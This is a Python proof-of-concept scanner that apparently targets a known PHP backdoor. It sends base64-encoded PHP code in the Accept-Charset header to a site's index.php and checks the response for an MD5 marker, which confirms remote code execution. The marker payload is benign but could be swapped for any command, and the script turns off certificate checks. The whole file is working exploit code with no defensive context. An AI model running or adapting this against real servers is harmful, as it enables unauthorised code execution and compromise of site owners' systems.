import requests,re,urllib3,base64
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r=randomLowercase(6)
string="printf(md5('" + r + "'));"
payload=base64.b64encode(string.encode()).decode()
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php"
	headers={'Accept-Charset': ''+payload+'', 'Accept-Encoding': 'gzip,deflate'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if md5(str(r).encode()).hexdigest() in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
